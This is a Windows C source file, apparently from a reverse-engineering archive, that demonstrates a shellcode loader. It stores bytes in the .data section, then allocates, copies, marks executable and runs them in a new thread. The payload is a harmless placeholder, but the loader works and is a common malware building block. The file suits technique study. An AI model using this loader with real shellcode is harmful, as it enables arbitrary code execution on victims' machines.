/*
    Shellcode Loader
    Archive of Reversing.ID

    storing payload in .data section

Compile:
    $ cl.exe /nologo /Ox /MT /W0 /GS- /DNDEBUG /Tccode.cpp

Technique:
    - allocation: VirtualAlloc
    - writing:    RtlMoveMemory
    - permission: VirtualProtect
    - execution:  CreateThread
*/

#include <windows.h>
#include <stdint.h>

// shellcode storage in global data
uint8_t     payload []  = { 0x90, 0x90, 0xCC, 0xC3 };
uint32_t    payload_len = 4;

int main ()
{
    void *  runtime;
    BOOL    retval;
    HANDLE  h_thread;
    DWORD   old_protect = 0;

    // allocate memory buffer for payload as READ-WRITE (no executable)
    runtime = VirtualAlloc (0, payload_len, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

    // copy payload to the buffer
    RtlMoveMemory (runtime, payload, payload_len);

    // make buffer executable (R-X)
    retval  = VirtualProtect (runtime, payload_len, PAGE_EXECUTE_READ, &old_protect);

    if (retval != 0)
    {
        h_thread = CreateThread (0, 0, (LPTHREAD_START_ROUTINE) runtime, 0, 0, 0);
        WaitForSingleObject (h_thread, -1);
    }

    // deallocate
    VirtualFree (runtime, payload_len, MEM_RELEASE);

    return 0;
}